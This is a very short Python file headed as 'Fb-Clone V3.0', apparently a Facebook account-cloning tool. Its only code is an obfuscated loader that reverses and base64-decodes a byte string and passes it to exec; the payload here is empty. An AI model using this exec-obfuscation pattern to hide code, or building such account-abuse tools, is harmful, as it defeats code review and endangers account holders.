#Created by MrUser#
#Locations(Madagascar)#
#Fb-Clone V3.0#
#Please follow my github account#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))